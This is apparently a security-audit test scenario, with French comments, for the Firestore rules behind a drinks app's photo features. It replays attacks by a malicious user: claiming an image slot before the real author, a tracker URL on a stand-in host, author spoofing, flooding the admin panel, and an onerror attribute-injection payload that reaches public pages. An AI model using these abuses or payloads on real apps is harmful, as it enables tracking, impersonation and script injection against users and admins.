/* ===========================================================================
   PARCOURS « photos-et-images » — le cycle de vie d'une image dans Magofeed.

   Ce que ce scenario rejoue, ligne par ligne, depuis index.html :
     fbSaveDiscoveryPhoto      index.html:5577
     fbLoadDiscoveryPhoto      index.html:5585
     fbMarkDiscoveryPhoto      index.html:5521
     fbRejectDiscoveryPhoto    index.html:5559
     fbApplyDrinkPhoto         index.html:2474
     fbLoadDrinkPhoto          index.html:2480
     fbSaveDrinkImage          index.html:2386
     fbLoadDrinkImages         index.html:2373
     fbSavePhotoSuggestion     index.html:5468
     fbLoadPhotoSuggestions    index.html:5478
     fbDeletePhotoSuggestion   index.html:5486
     fbAddDiscovery            index.html:5644
     fbPromoteDiscovery        index.html:2428
     fbCommunityAddDrinks      index.html:5408   (ce qu'ecrit le bouton frigo)
     fbNettoyerEmojis          index.html:5070
     fbNotifyUser              index.html:5533

   fbIdentifyFridge (index.html:4974) et fbConfirmAiDrink (index.html:4996) ne
   sont que des httpsCallable : leur VRAI code est cote serveur
   (functions-a-deployer/scan-frigo.js et reconnaissance-ia.js). On ne peut pas
   les executer ici, mais on peut verifier ce qu'ils ecrivent — et surtout ce
   qu'ils N'ECRIVENT PAS — en rejouant exactement leurs ecritures Admin SDK et
   celles du client qui les suit.
   =========================================================================== */
import { banc, doit, doitEchouer, note, bilan } from "../banc.mjs";
import { doc, setDoc, updateDoc, deleteDoc, getDoc, getDocs, collection, query,
         limit, writeBatch, addDoc, serverTimestamp, arrayUnion, increment } from "firebase/firestore";

const env = await banc("photos-et-images");
const alice   = env.authenticatedContext("alice").firestore();   // l'autrice de la decouverte
const bob     = env.authenticatedContext("bob").firestore();     // un membre ordinaire
const mallory = env.authenticatedContext("mallory").firestore(); // un membre malveillant
const chef    = env.authenticatedContext("chef").firestore();    // l'administrateur
const anon    = env.unauthenticatedContext().firestore();        // un visiteur sans compte

await env.withSecurityRulesDisabled(async (ctx) => {
  await setDoc(doc(ctx.firestore(), "admins", "chef"), { role: "fondateur" });
});

/* Une image reelle, minuscule, au format que produit compressPhotoFile
   (index.html:18536 : canvas.toDataURL("image/jpeg", q)). */
const JPEG = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==";
const AUTRE_JPEG = JPEG.replace("/9j/4AAQ", "/9j/4AAQ"); // meme octets : on distingue par un champ

/* ══════════════════════════════════════════════════════════════════════════
   LES FONCTIONS DE L'APP, RECOPIEES A L'IDENTIQUE.
   Seule difference : on ne masque pas les erreurs. L'app, elle, les avale
   souvent (fbLoadDiscoveryPhoto : `catch (e) { return null; }`).
   ══════════════════════════════════════════════════════════════════════════ */

// index.html:5577
async function fbSaveDiscoveryPhoto(db, uid, discId, base64) {
  await setDoc(doc(db, "discoveryPhotos", String(discId)), {
    data: String(base64),
    by: uid,
    createdAt: serverTimestamp()
  });
}
// index.html:5585
async function fbLoadDiscoveryPhoto(db, discId) {
  const snap = await getDoc(doc(db, "discoveryPhotos", String(discId)));
  return snap.exists() ? snap.data().data : null;
}
// index.html:5521
async function fbMarkDiscoveryPhoto(db, discId) {
  await updateDoc(doc(db, "discoveries", String(discId)), { hasPhoto: true });
}
// index.html:5559 (fbRejectDiscoveryPhoto, sans les try/catch qui avalent)
async function fbRejectDiscoveryPhoto(db, disc) {
  const id = String(disc.fbId || disc.barcode || disc.id);
  let by = (disc && disc.by) || null;
  const snap = await getDoc(doc(db, "discoveryPhotos", id));
  if (!by && snap.exists()) by = snap.data().by || null;
  await deleteDoc(doc(db, "discoveryPhotos", id));
  await updateDoc(doc(db, "discoveries", id), { hasPhoto: false, photoRejected: true });
  if (by) await fbNotifyUser(db, by, {
    type: "photoRejected", title: "Photo à refaire",
    body: "Ta photo de « " + String(disc.name || "ta découverte").slice(0, 40) + " » ne correspondait pas au produit.",
    barcode: String(disc.barcode || disc.id || "")
  });
}
// index.html:5533
async function fbNotifyUser(db, uid, notif) {
  await addDoc(collection(db, "userNotifs"), Object.assign(
    { to: String(uid), read: false, createdAt: serverTimestamp() }, notif || {}));
}
// index.html:2474
async function fbApplyDrinkPhoto(db, drinkId, base64) {
  await setDoc(doc(db, "drinkPhotos", String(drinkId)), {
    data: String(base64), createdAt: serverTimestamp()
  });
}
// index.html:2480
async function fbLoadDrinkPhoto(db, drinkId) {
  const snap = await getDoc(doc(db, "drinkPhotos", String(drinkId)));
  return snap.exists() ? snap.data().data : null;
}
// index.html:2386 — avec sa retombee setDoc/merge, telle quelle
async function fbSaveDrinkImage(db, drinkId, url) {
  const updates = { v: 3 };
  updates["map." + drinkId] = url;
  try {
    await updateDoc(doc(db, "meta", "drinkImages"), updates);
  } catch (e) {
    const data = { map: {}, v: 3 };
    data.map[drinkId] = url;
    await setDoc(doc(db, "meta", "drinkImages"), data, { merge: true });
  }
}
// index.html:2373
async function fbLoadDrinkImages(db) {
  const snap = await getDoc(doc(db, "meta", "drinkImages"));
  return (snap.exists() && snap.data().v === 3) ? (snap.data().map || {}) : {};
}
// index.html:5468 — l'id du document est fabrique par l'app : drinkId + "_" + Date.now()
async function fbSavePhotoSuggestion(db, uid, drinkId, drinkName, base64, tsForce) {
  await setDoc(doc(db, "photoSuggestions", String(drinkId) + "_" + (tsForce || Date.now())), {
    drinkId: Number(drinkId) || drinkId,
    drinkName: String(drinkName).slice(0, 60),
    data: String(base64),
    by: uid,
    createdAt: serverTimestamp()
  });
}
// index.html:5478
async function fbLoadPhotoSuggestions(db) {
  const snap = await getDocs(query(collection(db, "photoSuggestions"), limit(25)));
  const rows = [];
  snap.forEach((d) => { const x = d.data(); x.docId = d.id; rows.push(x); });
  return rows;
}
// index.html:5486
async function fbDeletePhotoSuggestion(db, docId) {
  await deleteDoc(doc(db, "photoSuggestions", String(docId)));
}
// index.html:5644 — branche "nouvelle decouverte"
async function fbAddDiscovery(db, uid, pseudo, barcode, name, brand, cat, extra) {
  const ref = doc(db, "discoveries", String(barcode));
  const votedRef = doc(db, "discoveries", String(barcode), "votedBy", uid);
  const batch = writeBatch(db);
  const data = { name: name, brand: brand || "", votes: 1, barcode: String(barcode),
                 by: uid, byPseudo: String(pseudo).slice(0, 24), createdAt: serverTimestamp() };
  if (cat) data.cat = cat;
  if (extra) Object.assign(data, extra);
  batch.set(ref, data);
  batch.set(votedRef, { votedAt: serverTimestamp() });
  await batch.commit();
  return data;
}
// index.html:2428 — fbPromoteDiscovery, la partie PHOTO (le reste du parcours
// « decouvertes » est couvert par scenarios/decouvertes.mjs)
async function fbPromoteDiscovery(db, disc, entry) {
  const data = Object.assign({}, entry, { createdAt: serverTimestamp(), fromBarcode: String(disc.barcode || "") });
  await setDoc(doc(db, "catalog", String(entry.id)), data);
  try { await updateDoc(doc(db, "discoveries", String(disc.fbId || disc.barcode || disc.id)), { decidedAt: serverTimestamp() }); } catch (e) {}
  let portee = null;
  if (disc.hasPhoto) {
    const photo = await fbLoadDiscoveryPhoto(db, disc.fbId || disc.barcode || disc.id);
    if (photo) { await fbApplyDrinkPhoto(db, entry.id, photo); portee = photo; }
  }
  await updateDoc(doc(db, "discoveries", String(disc.fbId || disc.barcode || disc.id)), { promoted: true });
  return portee;
}
// index.html:5408 — CE QUE LE BOUTON « Ajouter a <magasin> » du scan de frigo ecrit
async function fbCommunityAddDrinks(db, storeId, ids, pseudo) {
  const nums = ids.map(Number).filter((n) => !isNaN(n));
  if (!nums.length) return 0;
  const upd = { drinks: arrayUnion.apply(null, nums) };
  const seenNow = Math.floor(Date.now() / 3600000) * 3600000;
  const quiNow = String(pseudo || "Explorateur").slice(0, 24);
  nums.forEach((id) => {
    upd["confirmations." + id] = increment(1);
    upd["seenAt." + id] = seenNow;
    upd["confirmedBy." + id] = quiNow;
    upd["confirmedAt." + id] = seenNow;
  });
  await updateDoc(doc(db, "stores", String(storeId)), upd);
  return nums.length;
}
// index.html:5070
async function fbNettoyerEmojis(db) {
  const snap = await getDocs(collection(db, "catalog"));
  const aVider = [];
  snap.forEach((d) => { const e = (d.data() || {}).emoji; if (typeof e === "string" && e.trim() !== "") aVider.push(d.id); });
  if (!aVider.length) return { trouves: 0, vides: 0 };
  let faits = 0;
  for (let i = 0; i < aVider.length; i += 400) {
    const lot = writeBatch(db);
    aVider.slice(i, i + 400).forEach((id) => { lot.update(doc(db, "catalog", id), { emoji: "" }); });
    await lot.commit();
    faits += Math.min(400, aVider.length - i);
  }
  return { trouves: aVider.length, vides: faits };
}

/* ══════════════════════════════════════════════════════════════════════════
   ACTE 1 — LE CYCLE COMPLET D'UNE PHOTO
   Alice scanne une canette inconnue, envoie sa photo, l'admin la voit, la
   promeut, et tout le monde voit l'image sur la fiche de la boisson.
   ══════════════════════════════════════════════════════════════════════════ */
const CODE = "5411188110309";          // la decouverte d'Alice
const ID_CATALOGUE = 900001;           // l'id de la boisson promue

await doit("1a. Alice depose sa decouverte (fbAddDiscovery, index.html:5644)", async () => {
  await fbAddDiscovery(alice, "alice", "Alice", CODE, "Ramune Original", "Sangaria", "Exotique",
    { hasPhoto: true, manualProposal: true });
});

await doit("1b. Alice envoie la photo (fbSaveDiscoveryPhoto, index.html:5577)", async () => {
  await fbSaveDiscoveryPhoto(alice, "alice", CODE, JPEG);
});

await doit("1c. Alice pose le drapeau hasPhoto (fbMarkDiscoveryPhoto, index.html:5521)", async () => {
  await fbMarkDiscoveryPhoto(alice, CODE);
});

await doitEchouer("1d. un visiteur SANS compte ne peut pas ouvrir la photo (get : isSignedIn)", async () => {
  await fbLoadDiscoveryPhoto(anon, CODE);
});

await doit("1e. l'admin ouvre la photo depuis le panneau (index.html:23302)", async () => {
  const p = await fbLoadDiscoveryPhoto(chef, CODE);
  if (p !== JPEG) throw new Error("photo illisible pour l'admin");
});

await doit("1f. l'admin promeut : catalogue + photo publique (fbPromoteDiscovery, index.html:2428)", async () => {
  const disc = { barcode: CODE, id: CODE, name: "Ramune Original", hasPhoto: true, by: "alice", foundIn: [] };
  const entry = { id: ID_CATALOGUE, name: "Ramune Original", brand: "Sangaria", cat: "Exotique",
                  emoji: "", color: "#ec7063", light: "#fdedec", tag: "RAMUNE", stars: 4.0, barcodes: [CODE] };
  const portee = await fbPromoteDiscovery(chef, disc, entry);
  if (portee !== JPEG) throw new Error("la photo n'a pas suivi la boisson");
});

await doit("1g. n'importe qui, meme sans compte, voit la photo du catalogue (fbLoadDrinkPhoto, index.html:2480)", async () => {
  const p = await fbLoadDrinkPhoto(anon, ID_CATALOGUE);
  if (p !== JPEG) throw new Error("photo publique absente");
});

await doit("1h. l'admin retire une mauvaise photo et previent l'auteur (fbRejectDiscoveryPhoto, index.html:5559)", async () => {
  await fbRejectDiscoveryPhoto(chef, { barcode: CODE, id: CODE, name: "Ramune Original", by: null });
  const s = await getDoc(doc(chef, "discoveries", CODE));
  if (s.data().hasPhoto !== false || s.data().photoRejected !== true) throw new Error("drapeaux non poses");
});

/* ══════════════════════════════════════════════════════════════════════════
   ACTE 2 — QUI PEUT ECRASER L'IMAGE D'UNE BOISSON DU CATALOGUE ?
   ══════════════════════════════════════════════════════════════════════════ */
await doitEchouer("2a. Bob, membre ordinaire, ne remplace pas la photo du catalogue (drinkPhotos)", async () => {
  await fbApplyDrinkPhoto(bob, ID_CATALOGUE, "data:image/jpeg;base64,PIRATE");
});

await doitEchouer("2b. Bob ne repeint pas la carte partagee des URLs (meta/drinkImages, update)", async () => {
  await updateDoc(doc(bob, "meta", "drinkImages"), { v: 3, ["map." + ID_CATALOGUE]: "https://pisteur.example/x.jpg" });
});

await doitEchouer("2c. ni par la retombee setDoc/merge de fbSaveDrinkImage (index.html:2392)", async () => {
  await setDoc(doc(bob, "meta", "drinkImages"), { map: { [ID_CATALOGUE]: "https://pisteur.example/x.jpg" }, v: 3 }, { merge: true });
});

await doit("2d. l'admin, lui, ecrit la carte partagee (fbSaveDrinkImage, index.html:2386)", async () => {
  await fbSaveDrinkImage(chef, ID_CATALOGUE, "https://images.openfoodfacts.org/images/products/541/118/811/0309/front_fr.4.400.jpg");
  const map = await fbLoadDrinkImages(anon);
  if (!map[ID_CATALOGUE]) throw new Error("carte vide");
});

await doitEchouer("2e. Alice ne peut pas REMPLACER sa propre photo de decouverte (update : isAdmin)", async () => {
  await fbSaveDiscoveryPhoto(alice, "alice", "5411188110310", JPEG);
  await fbSaveDiscoveryPhoto(alice, "alice", "5411188110310", "data:image/jpeg;base64,MIEUX");
});
note("2e bis — le refus est honnete cote app : index.html:17677 affiche « Une photo existe deja pour ce produit », pas « reessaie ».");

/* ── LA PREEMPTION ────────────────────────────────────────────────────────
   discoveryPhotos/{id} accepte la CREATION par tout compte connecte, sur
   N'IMPORTE QUEL identifiant, y compris celui d'une decouverte qui n'existe
   pas encore. Mallory pose donc son image AVANT l'auteur du scan. */
const CODE2 = "5449000000996";
await doit("2f. Mallory pose une image sur un code-barre AVANT que la decouverte existe", async () => {
  await fbSaveDiscoveryPhoto(mallory, "mallory", CODE2, "data:image/jpeg;base64,IMAGEDEMALLORY");
});
await doit("2g. Bob scanne vraiment ce produit et cree la decouverte", async () => {
  await fbAddDiscovery(bob, "bob", "Bob", CODE2, "Coca-Cola Zero", "Coca-Cola", "Soda", { hasPhoto: true });
});
await doitEchouer("2h. Bob, l'auteur, ne peut plus mettre SA photo : la place est prise", async () => {
  await fbSaveDiscoveryPhoto(bob, "bob", CODE2, JPEG);
});
await doit("2i. et a la promotion, c'est l'image de Mallory qui devient la photo publique", async () => {
  const disc = { barcode: CODE2, id: CODE2, name: "Coca-Cola Zero", hasPhoto: true, by: "bob", foundIn: [] };
  const entry = { id: 900002, name: "Coca-Cola Zero", brand: "Coca-Cola", cat: "Soda", emoji: "", stars: 4.0, barcodes: [CODE2] };
  await fbPromoteDiscovery(chef, disc, entry);
  const publique = await fbLoadDrinkPhoto(anon, 900002);
  if (publique !== "data:image/jpeg;base64,IMAGEDEMALLORY") throw new Error("ce n'est pas l'image de Mallory");
});
note("2i bis — index.html:23294 : la photo n'est affichee a l'admin que s'il clique « Voir la photo envoyee ». Le bouton « Promouvoir » (index.html:23291, clic index.html:23326) ne l'oblige a rien voir.");

/* ══════════════════════════════════════════════════════════════════════════
   ACTE 3 — PEUT-ON TOUT LISTER ? FUITE DE DONNEES ?
   ══════════════════════════════════════════════════════════════════════════ */
await doitEchouer("3a. Bob ne peut pas lister TOUTES les photos de decouvertes (list : isAdmin)", async () => {
  await getDocs(collection(bob, "discoveryPhotos"));
});
await doit("3b. l'admin, lui, peut les lister", async () => {
  await getDocs(collection(chef, "discoveryPhotos"));
});
await doitEchouer("3c. Bob ne peut pas lire les suggestions de photos (fbLoadPhotoSuggestions, index.html:5478)", async () => {
  await getDocs(query(collection(bob, "photoSuggestions"), limit(25)));
});
await doitEchouer("3d. Bob ne peut pas lire UNE suggestion precise non plus", async () => {
  await getDoc(doc(bob, "photoSuggestions", "42_1"));
});

/* Mais discoveryPhotos accepte le 'get' de tout compte connecte — et un compte
   anonyme s'obtient en ouvrant la page (index.html:5617 ensureAuthed). L'id
   d'une photo EST le code-barre du produit : il se devine. */
await doit("3e. Bob lit la photo d'Alice par son code-barre, et l'uid de son autrice", async () => {
  await fbSaveDiscoveryPhoto(alice, "alice", "3068320055008", JPEG);
  const s = await getDoc(doc(bob, "discoveryPhotos", "3068320055008"));
  if (s.data().by !== "alice") throw new Error("pas d'uid lisible");
});
note("3e bis — 'get' est volontaire (commentaire firestore.rules:757) : l'app lit une photo a la fois, au scan (index.html:9317). Le cout : un code-barre se devine, l'uid de l'auteur part avec l'image.");

await doit("3f. drinkPhotos est lisible ET listable par tout le monde (read: if true, firestore.rules:663)", async () => {
  const snap = await getDocs(collection(anon, "drinkPhotos"));
  if (snap.size < 1) throw new Error("rien a lister");
  note("3f bis — " + snap.size + " document(s) rapatrie(s) d'un coup par un visiteur sans compte ; chacun porte une image base64 jusqu'a ~250 Ko (index.html:18545).");
});

/* ══════════════════════════════════════════════════════════════════════════
   ACTE 4 — UNE IMAGE PEUT-ELLE ETRE UNE URL EXTERNE ARBITRAIRE ?
   Les deux collections ou un MEMBRE ecrit ne valident pas le champ 'data'.
   Or l'app le pose tel quel dans <img src=...> :
     - suggestions : index.html:24798  card.querySelector("img").src = r.data
     - decouvertes : index.html:23306  img.src = data
   Un membre choisit donc une URL que le navigateur de l'ADMIN ira chercher.
   ══════════════════════════════════════════════════════════════════════════ */
const PISTEUR = "https://pisteur.example/pixel.gif?qui=admin&quand=ouverture";

await doit("4a. Mallory depose une suggestion dont l'« image » est une URL externe", async () => {
  await fbSavePhotoSuggestion(mallory, "mallory", 12, "Fanta Orange", PISTEUR, 1000000000001);
});
await doit("4b. l'admin la recoit telle quelle : son navigateur ira chercher cette URL (index.html:24798)", async () => {
  const rows = await fbLoadPhotoSuggestions(chef);
  const r = rows.find((x) => x.docId === "12_1000000000001");
  if (!r || r.data !== PISTEUR) throw new Error("la suggestion n'est pas arrivee");
});
await doit("4c. meme chose sur une photo de decouverte (index.html:23306)", async () => {
  await fbSaveDiscoveryPhoto(mallory, "mallory", "4000177050101", PISTEUR);
  const p = await fbLoadDiscoveryPhoto(chef, "4000177050101");
  if (p !== PISTEUR) throw new Error("URL non conservee");
});

/* photoSuggestions : `allow create: if isSignedIn()` et rien d'autre
   (firestore.rules:775). Ni 'by == uid', ni liste de champs, ni bornes. */
await doit("4d. Mallory signe une suggestion au nom d'Alice (aucun controle de 'by')", async () => {
  await setDoc(doc(mallory, "photoSuggestions", "12_1000000000002"), {
    drinkId: 12, drinkName: "Fanta Orange", data: JPEG, by: "alice", createdAt: serverTimestamp()
  });
  const rows = await fbLoadPhotoSuggestions(chef);
  const r = rows.find((x) => x.docId === "12_1000000000002");
  if (!r || r.by !== "alice") throw new Error("usurpation non enregistree");
});

/* fbLoadPhotoSuggestions fait limit(25) SANS orderBy : Firestore rend alors les
   25 premiers par nom de document. Le nom est fabrique par le client
   (drinkId + "_" + Date.now(), index.html:5470) : Mallory choisit donc son rang. */
await doit("4e. Mallory noie le panneau : 30 suggestions dont le nom passe devant", async () => {
  for (let i = 0; i < 30; i++) {
    await setDoc(doc(mallory, "photoSuggestions", "0_" + String(1000000000000 + i)), {
      drinkId: 0, drinkName: "spam " + i, data: JPEG, by: "mallory", createdAt: serverTimestamp()
    });
  }
});
await doit("4f. la suggestion honnete d'Alice n'arrive plus jusqu'a l'admin", async () => {
  await fbSavePhotoSuggestion(alice, "alice", 12, "Fanta Orange (vraie photo)", JPEG, 1000000000003);
  const rows = await fbLoadPhotoSuggestions(chef);
  const vue = rows.some((x) => x.docId === "12_1000000000003");
  note("4f bis — l'admin recoit " + rows.length + " lignes ; la suggestion d'Alice y est : " + (vue ? "OUI" : "NON") + ".");
  if (vue) throw new Error("elle passe encore — le noyage n'a pas pris");
});
await doit("4g. l'admin peut au moins faire le menage (fbDeletePhotoSuggestion, index.html:5486)", async () => {
  await fbDeletePhotoSuggestion(chef, "0_1000000000000");
});
await doitEchouer("4h. Mallory ne peut pas effacer les suggestions des autres", async () => {
  await fbDeletePhotoSuggestion(mallory, "12_1000000000003");
});

/* Le champ 'data' n'est pas seulement une URL possible : c'est une chaine
   LIBRE. Or l'app la concatene dans un attribut HTML, sans echappement :
     index.html:12424  '<img src="' + url + '" ... onerror="...">'
     index.html:13753  idem, pour les grandes cartes
   ou 'url' vient de imgCache, rempli par fbLoadDrinkPhoto (index.html:12545).
   Et fbPromoteDiscovery recopie discoveryPhotos.data dans drinkPhotos SANS
   qu'un humain ait a regarder l'image (index.html:2437). */
const CODE3 = "8410128750121";
const CHARGE = 'x" onerror="document.title=String.fromCharCode(88)';

await doit("4i. Mallory depose un 'data' qui n'est pas une image mais casse l'attribut HTML", async () => {
  await fbSaveDiscoveryPhoto(mallory, "mallory", CODE3, CHARGE);
  await fbAddDiscovery(mallory, "mallory", "Mallory", CODE3, "Boisson piegee", "", "Soda", { hasPhoto: true });
});
await doit("4j. la promotion le recopie tel quel dans drinkPhotos, sans clic de l'admin sur l'image", async () => {
  const disc = { barcode: CODE3, id: CODE3, name: "Boisson piegee", hasPhoto: true, by: "mallory", foundIn: [] };
  const entry = { id: 900004, name: "Boisson piegee", brand: "", cat: "Soda", emoji: "", stars: 4.0, barcodes: [CODE3] };
  await fbPromoteDiscovery(chef, disc, entry);
  const publique = await fbLoadDrinkPhoto(anon, 900004);
  if (publique !== CHARGE) throw new Error("la chaine a ete alteree en route");
});
note("4j bis — la chaine arrive intacte chez un visiteur SANS compte, puis part dans <img src=\"...\"> par concatenation (index.html:12424 et index.html:13753). Le onerror injecte est le PREMIER du tag : c'est lui que le navigateur garde.");

/* ══════════════════════════════════════════════════════════════════════════
   ACTE 5 — LA TAILLE : jusqu'ou, et que dit l'app quand ca deborde ?
   compressPhotoFile (index.html:18536) vise 250 Ko (produit) / 420 Ko (frigo).
   La limite d'un document Firestore est de 1 048 576 octets.
   ══════════════════════════════════════════════════════════════════════════ */
function faussePhoto(nOctets) { return "data:image/jpeg;base64," + "A".repeat(nOctets); }

await doit("5a. une photo de 250 Ko (la cible de compressPhotoFile) passe", async () => {
  await fbSaveDiscoveryPhoto(alice, "alice", "3017620422003", faussePhoto(250 * 1024));
});
await doit("5b. une photo de 900 Ko passe encore", async () => {
  await fbSaveDiscoveryPhoto(alice, "alice", "3017620425035", faussePhoto(900 * 1024));
});
let messageDebordement = "";
await doitEchouer("5c. une photo de 1,2 Mo est refusee par Firestore", async () => {
  try {
    await fbSaveDiscoveryPhoto(alice, "alice", "3017620425036", faussePhoto(1200 * 1024));
  } catch (e) {
    messageDebordement = String((e && e.code) || "") + " / " + String((e && e.message) || e).slice(0, 150);
    throw e;
  }
});
note("5c bis — ce que l'app recoit : " + messageDebordement);
note("5c ter — index.html:18767 repond alors « Photo non envoyee (verifie la regle discoveryPhotos) » et index.html:18714 « Suggestion non envoyee (regle photoSuggestions ?) » : deux messages qui accusent les REGLES alors que le refus vient de la taille.");

await doit("5d. une suggestion de 1,2 Mo echoue de la meme facon (aucune borne dans les regles)", async () => {
  let refus = null;
  try { await fbSavePhotoSuggestion(mallory, "mallory", 12, "grosse", faussePhoto(1200 * 1024), 1000000000009); }
  catch (e) { refus = String((e && e.code) || e); }
  if (!refus) throw new Error("1,2 Mo accepte dans photoSuggestions ?!");
  note("5d bis — photoSuggestions accepte jusqu'a la limite Firestore : ~1 Mo par suggestion, sans plafond de nombre.");
});

/* ══════════════════════════════════════════════════════════════════════════
   ACTE 6 — L'IA PEUT-ELLE ECRIRE DU STOCK SANS QU'UN HUMAIN CONFIRME ?
   fbIdentifyFridge (index.html:4974) -> scan-frigo.js : elle RETOURNE une
   liste, elle n'ecrit que ses compteurs de quota.
   fbConfirmAiDrink (index.html:4996) -> reconnaissance-ia.js:219 : elle ecrit
   catalog + drinkPhotos + discoveries.promoted + userNotifs. JAMAIS stores.
   On rejoue ici les DEUX ecritures pour le montrer, avec les vrais droits.
   ══════════════════════════════════════════════════════════════════════════ */
await doitEchouer("6a. aucun client ne peut ecrire le verdict de l'IA (aiVerified : refus par defaut)", async () => {
  await setDoc(doc(mallory, "aiVerified", "mallory"), { name: "Faux Soda", confidence: 99, ts: Date.now() });
});
await doitEchouer("6b. aucun client ne peut le LIRE non plus", async () => {
  await getDoc(doc(mallory, "aiVerified", "mallory"));
});
await doitEchouer("6c. un membre ne peut pas s'auto-promouvoir au catalogue (ce que fait confirmAiDrink cote serveur)", async () => {
  await setDoc(doc(mallory, "catalog", "900003"), { id: 900003, name: "Boisson fantome", cat: "Soda", aiVerified: true });
});
await doit("6d. une decouverte encore en vote existe", async () => {
  await fbAddDiscovery(bob, "bob", "Bob", "5000112611861", "Fanta Exotic", "Fanta", "Soda", {});
});
await doitEchouer("6e. Mallory ne peut pas la marquer 'promoted' lui-meme", async () => {
  await updateDoc(doc(mallory, "discoveries", "5000112611861"), { promoted: true });
});
await doitEchouer("6f. ni l'auteur lui-meme (changed() n'autorise que votes/hasPhoto/name/brand/cat/foundIn)", async () => {
  await updateDoc(doc(bob, "discoveries", "5000112611861"), { promoted: true });
});
note("6f bis — reecrire promoted:true sur une decouverte DEJA promue passe (changed() est alors vide) : ecriture sans effet, la valeur ne bouge pas.");

/* Le scan de frigo : ou le stock est-il ecrit ? Dans le bouton, apres le clic. */
await doit("6g. le magasin existe (cree par la communaute)", async () => {
  await setDoc(doc(bob, "stores", "night-shop-ixelles"), {
    name: "Night Shop Ixelles", lat: 50.827, lng: 4.367, addedBy: "bob", drinks: []
  });
});
await doit("6h. rien n'est ecrit tant que personne n'a clique « Ajouter » (index.html:16448)", async () => {
  const s = await getDoc(doc(anon, "stores", "night-shop-ixelles"));
  const d = s.data() || {};
  if ((d.drinks || []).length !== 0 || d.confirmations) throw new Error("du stock est apparu sans clic humain");
});
await doit("6i. apres le clic humain, l'ecriture est celle de la communaute (fbCommunityAddDrinks, index.html:5408, appelee index.html:16467)", async () => {
  await fbCommunityAddDrinks(bob, "night-shop-ixelles", [ID_CATALOGUE], "Bob");
  const s = await getDoc(doc(anon, "stores", "night-shop-ixelles"));
  const d = s.data();
  if (d.confirmations[ID_CATALOGUE] !== 1) throw new Error("confirmation absente");
  if (d.confirmedBy[ID_CATALOGUE] !== "Bob") throw new Error("signature absente");
  note("6i bis — ce clic ecrit confirmations+1, confirmedBy=\"Bob\" et confirmedAt=maintenant : la fiche dira « confirme par Bob ».");
});
note("6j — index.html:16416 : la case est PRE-COCHEE des que la certitude de l'IA atteint 60 %. Or scan-frigo.js:216 dit a l'IA « etiquette lisible = 80+, devine a la silhouette/couleur = 50 ou moins ». Entre 60 et 79, une supposition part cochee et devient « confirme par <pseudo> » si l'utilisateur valide sans decocher.");

/* ══════════════════════════════════════════════════════════════════════════
   ACTE 7 — fbNettoyerEmojis (index.html:5070)
   ══════════════════════════════════════════════════════════════════════════ */
await doit("7a. deux fiches du catalogue portent un emoji (ecrit par l'ancienne fonction serveur)", async () => {
  await setDoc(doc(chef, "catalog", "900010"), { id: 900010, name: "Inca Kola", emoji: "🥤", cat: "Soda" });
  await setDoc(doc(chef, "catalog", "900011"), { id: 900011, name: "Ramune", emoji: "", cat: "Exotique" });
});
await doitEchouer("7b. Bob ne peut pas vider les emojis (catalog : ecriture isAdmin)", async () => {
  await fbNettoyerEmojis(bob);
});
await doit("7c. l'admin nettoie, et ne touche que ce qui n'est pas deja vide", async () => {
  const r = await fbNettoyerEmojis(chef);
  if (r.trouves !== 1 || r.vides !== 1) throw new Error("compte faux : " + JSON.stringify(r));
  const s = await getDoc(doc(anon, "catalog", "900010"));
  if (s.data().emoji !== "") throw new Error("emoji encore la");
});
await doit("7d. rejouable sans risque : la deuxieme passe ne trouve plus rien", async () => {
  const r = await fbNettoyerEmojis(chef);
  if (r.trouves !== 0) throw new Error("elle retravaille : " + JSON.stringify(r));
});

await bilan(env);
